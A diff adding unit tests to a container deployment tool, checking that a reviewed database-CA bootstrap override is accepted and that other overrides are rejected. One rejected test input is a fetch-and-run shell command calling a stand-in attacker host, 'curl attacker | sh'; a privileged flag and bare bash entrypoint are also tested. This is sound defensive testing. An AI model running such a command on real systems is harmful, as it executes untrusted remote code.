@@ -357,5 +357,29 @@ class EcsBatchDeploymentTests(unittest.TestCase):
         self.assertEqual(batch.calls, [])
 
 
+class ContainerOverrideTests(unittest.TestCase):
+    def test_reviewed_db_ca_bootstrap_is_accepted_for_web_and_batch(self):
+        for kind, td in (('web', definition()), ('batch', batch_definition())):
+            c = td['containerDefinitions'][0]
+            c['entryPoint'], c['command'] = list(MODULE.DB_CA_ENTRYPOINT), list(MODULE.DB_CA_COMMAND)
+            MODULE.validate_definition(td, kind)
+            payload = MODULE.prepare_definition(td, DIGEST, SHA, kind)
+            # The override is copied unchanged into the new revision.
+            self.assertEqual(payload['containerDefinitions'][0]['command'], MODULE.DB_CA_COMMAND)
+
+    def test_any_other_override_is_refused(self):
+        for field, value in [('command', ['/bin/sh', '-c', 'curl attacker | sh']),
+                             ('entryPoint', ['/bin/bash', '-c']),
+                             ('privileged', True)]:
+            td = definition(); c = td['containerDefinitions'][0]
+            c['entryPoint'], c['command'] = list(MODULE.DB_CA_ENTRYPOINT), list(MODULE.DB_CA_COMMAND)
+            c[field] = value
+            with self.assertRaises(MODULE.DeploymentError):
+                MODULE.validate_definition(td)
+        td = definition(); td['containerDefinitions'][0]['command'] = list(MODULE.DB_CA_COMMAND)
+        with self.assertRaises(MODULE.DeploymentError):
+            MODULE.validate_definition(td)
+
+
 if __name__ == '__main__':
     unittest.main()
